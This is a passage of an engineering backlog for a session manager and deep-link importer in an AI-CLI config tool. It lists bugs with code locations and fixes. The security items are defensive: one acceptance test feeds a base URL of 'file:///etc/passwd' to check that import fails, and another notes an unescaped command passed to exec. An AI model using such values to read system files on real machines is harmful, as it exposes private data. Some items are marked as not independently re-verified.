- **Acceptance:** No file in `src/components/sessions` exceeds ~500 lines; `rg parse_deeplink src` only matches the Rust parser; existing tests still pass.

### SESS-26: Warp launcher writes an executable temp script into the user's project directory

**Type:** bug · **Priority:** P3 · **Effort:** S · **Confidence:** high

- **Evidence:** `src-tauri/src/session_manager/terminal/mod.rs:206-246` — `tempfile_in(cwd)` with `disable_cleanup(true)` and mode `0o755`, content `rm -- "$0"; exec {command}`; it errors when `cwd` is `None` (`:211`) and leaves the script behind if Warp never runs it (`:236-245` only checks `open` exit status).
- **Problem:** Pollutes git working trees (shows up in `git status`), fails for sessions without a project dir, and executes the unescaped command via `exec`.
- **Proposal:** Write the script under the app's temp dir (`std::env::temp_dir()/cc-switch/`) and `cd` inside the script; delete it on a timer if unused; build the command from `ResumeSpec` (SESS-01).
- **Acceptance:** Resume via Warp leaves no file in the project dir; works for sessions without `projectDir`.

### SESS-27: Delete side-effects are incomplete or unchecked for Codex, Hermes and OpenClaw

**Type:** bug · **Priority:** P3 · **Effort:** S · **Confidence:** medium

- **Evidence:** `src-tauri/src/session_manager/providers/codex.rs:271-290` removes only the rollout JSONL; the titles loaded from `session_index.jsonl` and the `threads` table (`codex.rs:93-202`) are left behind. `hermes.rs:488-496` deletes the JSONL without verifying `_session_id`. `openclaw.rs:302-338` rewrites `sessions.json` with `write_json_file` while the OpenClaw gateway may be writing the same index.
- **Problem:** Codex's own resume picker can keep listing a deleted thread; Hermes deletes cannot detect a stale/mismatched request; OpenClaw index rewrites can race with the running gateway.
- **Proposal:** For Codex, prune the `session_index.jsonl` entry (and document that the state DB is left to Codex); verify Hermes ids by re-parsing; for OpenClaw, write via temp file + rename and re-read before pruning, or skip index pruning when the gateway is running.
- **Acceptance:** Tests: Codex delete removes the index entry; Hermes delete with mismatched id errors.

### SESS-29: Timestamps without a timezone offset are rejected, leaving sessions with "unknown" time

**Type:** bug · **Priority:** P3 · **Effort:** S · **Confidence:** medium

- **Evidence:** `src-tauri/src/session_manager/providers/utils.rs:60-64` only accepts RFC 3339 strings (`DateTime::parse_from_rfc3339`); Hermes readers accept `ts`/`timestamp` from heterogeneous JSONL (`hermes.rs:331-334,398-401`) and SQLite rows via `row_to_json` (`hermes.rs:168-185`), and Grok's `created_at`/`updated_at` are untyped `Value`s (`grokbuild.rs:27-31`). Sorting treats `None` as 0 (`mod.rs:87-91`) and the list shows `common.unknown` (`SessionItem.tsx:102-104`).
- **Problem:** Naive ISO timestamps (`2026-03-06T10:17:58`), `YYYY-MM-DD HH:MM:SS` (SQLite `datetime()` default) or microsecond integers sort to the bottom with no date.
- **Proposal:** Extend `parse_timestamp_to_ms` with fallbacks: naive ISO (assume UTC), SQLite datetime format, and integer scale detection for seconds/millis/micros; add unit tests per format.
- **Acceptance:** Tests cover the four formats; Hermes fixture rows using `datetime('now')` get a valid `last_active_at`.

### SESS-30: Deep-link ergonomics: batch import, version negotiation, in-app "share as link"

**Type:** feature · **Priority:** P3 · **Effort:** M · **Confidence:** high

- **Evidence:** One resource per URL (`src-tauri/src/deeplink/parser.rs:52-67`); unknown versions are a hard error with no hint (`parser.rs:35-39`), so a future `v2` link opens an old app and shows a toast; links can only be generated outside the app (`deplink.html:1272-1466,1960-2134`); `DeepLinkImportDialog.tsx:51-78` overwrites an open dialog when a second link arrives.
- **Problem:** Vendor onboarding that needs provider + MCP + prompt requires three clicks and three dialogs; there is no upgrade path and no first-party way to share a configured provider.
- **Proposal:** Covered by SESS-10's envelope; additionally queue incoming links while a dialog is open; add a "Copy share link" action to provider/MCP/prompt cards with a "include API key" toggle; on unsupported version show "update CC Switch to ≥ X".
- **Acceptance:** Two links clicked back-to-back show two sequential dialogs; a provider card can emit a link that round-trips through the parser.

### SESS-31: Silent failures: provider thread panics are swallowed and the UI has no error states

**Type:** bug · **Priority:** P3 · **Effort:** S · **Confidence:** high

- **Evidence:** `src-tauri/src/session_manager/mod.rs:68-74` uses `join().unwrap_or_default()` with no log; the provider scanners return `Vec::new()` on every I/O error (`claude.rs:273-276`, `opencode.rs:102-115`); `SessionManagerPage.tsx:192-193` ignores `error` from `useSessionsQuery` and `:323-327` ignores message-load errors, rendering `noSessions`/`emptySession` instead (`:1227-1233`, `:1641-1647`). `session-manager.md:92-95` (FR-6) requires distinguishable error states.
- **Problem:** A permission problem or a parser panic looks identical to "no sessions", making support cases hard to diagnose.
- **Proposal:** Return `ScanReport { sessions, errors: Vec<{provider, message}> }`, log panics with `log::error!`, and render a non-blocking banner listing provider errors; show a retry state for message-load failures.
- **Acceptance:** Simulated unreadable root yields a banner naming the provider; panic in one provider still lists the others and logs the panic.

### SESS-32: `enabled` semantics and app aliases differ across deep-link resource types

**Type:** tech-debt · **Priority:** P3 · **Effort:** S · **Confidence:** high

- **Evidence:** Provider: `enabled=true` switches the live provider (`deeplink/provider.rs:130-134`); prompt: enables and writes the file (`deeplink/prompt.rs:60-84`); MCP: ignored, always written (`deeplink/mcp.rs:40-151`); skill: defaults to `true` (`deeplink/skill.rs:42`). `parse_mcp_deeplink` accepts the `grok` alias (`parser.rs:261-278`, `mcp.rs:169`) while provider/prompt parsers only accept `grokbuild` (`parser.rs:82-89,191-198`). The frontend type still restricts `app` to `"claude" | "codex" | "gemini"` (`src/lib/api/deeplink.ts:10`).
- **Problem:** Link authors and users cannot predict what "enabled" does; alias handling is inconsistent; TS types lie about accepted apps.
- **Proposal:** Define `enabled` uniformly as "activate after import, default false" in the protocol spec (SESS-24), share one `parse_app_id` helper with aliases, and update the TS union to the full `AppId` set.
- **Acceptance:** Spec table lists `enabled` per resource; parser tests for `grok` alias in all resource types.

### SESS-33: Unbounded deep-link payloads and lenient base64 decoding

**Type:** security · **Priority:** P3 · **Effort:** S · **Confidence:** medium

- **Evidence:** `src-tauri/src/deeplink/utils.rs:30-80` builds up to four candidate strings of the full input and tries four engines each (up to 16 decode attempts of an arbitrarily large payload); `parser.rs:50` collects all query pairs with no length limit; `provider.rs:589-620` then parses JSON/TOML of any size; `mcp.rs:74-83` deserializes an arbitrarily nested `mcpServers` object; `deeplink/prompt.rs:47-49` stores content of any size in the DB.
- **Problem:** A multi-MB link (possible via command-line/second-instance delivery on Windows/Linux, `lib.rs:248-255`) costs memory and time and can persist huge prompts/MCP specs.
- **Proposal:** Reject URLs >64 KB and decoded payloads >256 KB up front; decode once with a single tolerant normalisation (`+`/space restore, padding fix, URL-safe → standard) instead of candidate fan-out; cap JSON nesting (`serde_json` recursion limit is 128 by default, keep it) and MCP server count (e.g. 50).
- **Acceptance:** Parser test: 1 MB URL returns `InvalidInput("too large")` in <5 ms; existing base64 edge-case tests still pass.

### SESS-34: `useSessionSearch` highlight and auto-expand use the list query inside message bodies

**Type:** bug · **Priority:** P3 · **Effort:** S · **Confidence:** high

- **Evidence:** `src/components/sessions/SessionManagerPage.tsx:1675` passes the list `search` string to every `SessionMessageItem`; `SessionMessageItem.tsx:40-48` then auto-expands any >3000-char message whose body contains the query and `:89-93` runs `highlightText` (a fresh `RegExp` per message per render, `utils.ts:233-251`) over the full content, although the list search never matched message bodies (`useSessionSearch.ts:33-45`).
- **Problem:** Typing a provider or directory name in the list search expands and re-highlights thousands of characters in the detail pane and the highlights do not correspond to the list results; large sessions re-render on every keystroke.
- **Proposal:** Decouple list search from the detail pane (dedicated find bar, SESS-16); memoize highlight regexes; only pass a query to message items when the find bar is active.
- **Acceptance:** Typing in the list search no longer changes the detail pane; React Profiler shows no `SessionMessageItem` re-renders on list-search keystrokes.

### SESS-42: Fallback 'unknown' IDs collide in usage request_id keys and drop rows across files

**Type:** bug · **Priority:** P3 · **Effort:** S · **Confidence:** medium

- **Evidence:** src-tauri/src/services/session_usage_codex.rs:556-560 builds `codex:<thread_id>:<event_index>` with `thread_id` defaulting to "unknown" when neither read_codex_session_identity nor a session_meta line provides it, so every such file produces `codex:unknown:1`, `codex:unknown:2`, and so on. session_usage_gemini.rs:183 and :191-192 build `gemini_session:<sid>:<message_id>` with both parts defaulting to "unknown". Inserts are idempotent on request_id (session_usage_codex.rs:627 and :666 `INSERT OR IGNORE`, gemini :263).
- **Problem:** Once one file has claimed `codex:unknown:N`, the Nth event of every other file without an identity (truncated or older-format rollouts) is skipped, and so is every Gemini message without an id in the same session. Usage and cost are silently under-counted, and the rows are reported as 'skipped' rather than as errors.
- **Proposal:** When an ID is missing, derive a stable fallback from the file: hash the canonical path or the filename UUID for Codex, and the array index plus timestamp for Gemini messages. Log a warning once per file.
- **Acceptance:** Test: two Codex rollout files with no session_meta, each with 3 token_count events, import 6 rows. A Gemini file with two id-less gemini messages imports 2 rows.
- **Verification:** added by completeness-critic pass (not independently re-verified)

### SESS-43: Endpoints taken from the inline deep-link config skip validate_url

**Type:** security · **Priority:** P3 · **Effort:** S · **Confidence:** high

- **Evidence:** src-tauri/src/deeplink/parser.rs:101-114 runs `validate_url` (http/https only) only on the URL `endpoint`/`homepage` params. When those are absent, provider.rs merge_claude_config (:673-678) copies `env.ANTHROPIC_BASE_URL`, merge_codex_config (:739-743) copies the TOML base_url, and merge_additive_config (:879-887) copies `baseUrl`/`options.baseURL`. None of these are validated, and they go straight into the stored provider (provider.rs:55-68, build_* functions). validate_url is called only from parser.rs (grep).
- **Problem:** A link can set `config=` with an endpoint such as `file:///…`, `ftp://…` or a malformed string. That gets past the scheme check the parser enforces and ends up in live CLI configs, giving broken or surprising providers and a way around future endpoint policy checks.
- **Proposal:** Run validate_url on every endpoint (and inferred homepage) after parse_and_merge_config, inside import_provider_from_deeplink, and in merge_deeplink_config so the preview shows the error too.
- **Acceptance:** Test: a Claude provider link with no endpoint param and config env ANTHROPIC_BASE_URL='file:///etc/passwd' fails import with an 'Invalid URL scheme' error.
- **Verification:** added by completeness-critic pass (not independently re-verified)

### SESS-44: configUrl links are previewed as if they are supported, but import always fails

**Type:** ux · **Priority:** P3 · **Effort:** S · **Confidence:** high

- **Evidence:** src-tauri/src/deeplink/parser.rs:129 accepts `configUrl`. provider.rs:594-598 always returns 'Remote config URL is not yet supported'. src/components/DeepLinkImportDialog.tsx:57-70 calls merge, shows an error toast, then falls back to opening the dialog anyway, and :216-221 and :612-620 render the configUrl as a normal 'config source' row with an enabled Import button that then fails again.
- **Problem:** Users who receive configUrl links get a confirmation dialog that looks importable, followed by an error. This is confusing, and nothing tells them how to fix it.
- **Proposal:** Reject configUrl in the parser with a clear message (and drop it from the generator), or implement fetching behind HTTPS + size limit + host disclosure. Until then, disable Import and show an inline explanation when only configUrl is present.
- **Acceptance:** Opening a link with only configUrl shows one clear 'not supported' message and no enabled Import button. No import attempt reaches the backend.
- **Verification:** added by completeness-critic pass (not independently re-verified)

### SESS-45: Refresh never reloads the open transcript; active sessions show stale messages

**Type:** ux · **Priority:** P3 · **Effort:** S · **Confidence:** high

- **Evidence:** src/components/sessions/SessionManagerPage.tsx:1140 refresh button calls only `refetch()` of `useSessionsQuery` (:192). The message query is keyed `['sessionMessages', providerId, sourcePath]` with staleTime 30 s (src/lib/query/queries.ts:315-324). Its key does not include `lastActiveAt`, so even after the list refetches and shows a newer last-active time, the cached transcript stays.
- **Problem:** While watching a session that is still running in a CLI, clicking refresh updates the list timestamp but the detail pane keeps the old messages until the cache expires or the user switches sessions. That makes the viewer unreliable for monitoring live work.
- **Proposal:** Have refresh also invalidate `['sessionMessages', selected.providerId, selected.sourcePath]`, and/or include `lastActiveAt` in the message query key so a newer list entry refetches automatically. Optionally poll the selected session while it was active in the last few minutes.
- **Acceptance:** With a session open, append a message to its file and click refresh; the new message appears in the detail pane without switching sessions.
- **Verification:** added by completeness-critic pass (not independently re-verified)

### SESS-46: session_log_sync rows are never pruned for deleted or moved files

**Type:** tech-debt · **Priority:** P3 · **Effort:** S · **Confidence:** medium

- **Evidence:** Rows are only ever added or replaced: session_usage.rs:385-408 `INSERT OR REPLACE` keyed by absolute file path. OpenCode adds one row per session (`<db>:<session_id>`, session_usage_opencode.rs:107-109, :149). Codex archived files inherit state through a suffix-match scan of the whole table (session_usage_codex.rs:189-200, `substr(file_path, -length(?2))`, which cannot use an index). Nothing deletes rows: grep shows no DELETE on session_log_sync, and the Session Manager delete paths (session_manager/mod.rs:104-118) do not touch it.
- **Problem:** The table grows without bound with every transcript ever seen, including ones deleted via the Session Manager. Each Codex archived-file lookup does a full table scan on suffix matching, which gets slower as history grows. Stale rows can also wrongly suppress re-import if a path is reused.
- **Proposal:** After each sync pass, delete rows whose path no longer exists, or that were not seen in N passes. Remove the row when the Session Manager deletes a session. Store the file name in its own indexed column for the archived-session inheritance lookup.
- **Acceptance:** After deleting a session file and running a sync, its session_log_sync row is gone. The archived inheritance query uses an index (EXPLAIN QUERY PLAN shows SEARCH, not SCAN).
- **Verification:** added by completeness-critic pass (not independently re-verified)
